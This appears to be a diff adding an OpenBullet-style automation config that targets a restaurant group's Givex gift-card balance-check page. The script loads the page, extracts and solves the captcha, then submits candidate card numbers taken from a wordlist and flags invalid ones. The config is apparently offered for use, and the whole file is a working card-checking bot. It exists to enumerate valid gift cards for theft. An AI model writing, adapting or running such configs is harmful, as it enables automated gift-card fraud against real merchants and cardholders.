@@ -1,0 +1,45 @@
+[SETTINGS]
+{
+  "Name": "EllisRestaurantGroup",
+  "SuggestedBots": 1,
+  "LastModified": "2018-05-11T14:45:32.4641176+00:00",
+  "AdditionalInfo": "NEED A WORKING CODE",
+  "Author": "boggy94",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#REQUEST_Capthaa REQUEST GET "https://wwws-pt1.givex.com/public/balance/balancecheck.py?_LANGUAGE_:en+3121207" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+PARSE "<SOURCE>" LR "\"securebmpr.py?" "\"" Recursive=FALSE -> VAR "CAPTCHA" "" "" 
+CAPTCHA "https://wwws-pt1.givex.com/public/balance/securebmpr.py?<CAPTCHA>" Base64=FALSE SendScreenshot=FALSE -> VAR "CODE" 
+#REQUEST_POST REQUEST POST "https://wwws-pt1.givex.com/public/balance/balancecheck.py?3121207+_LANGUAGE_:en" AutoRedirect=TRUE 
+  CONTENT "cardnum=<USER>&_LANGUAGE_=en&_FUNCTION_=result&webinfo_id=<CAPTCHA>&merchant_id=3121207&partner_id=1&code=<CODE>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://wwws-pt1.givex.com/public/balance/balancecheck.py?_LANGUAGE_:en+3121207" 
+  HEADER "Origin: https://wwws-pt1.givex.com" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Card number is invalid" 
+    KEY "Sorry! The validation field entry does not match the letters contained in the bitmap image." 
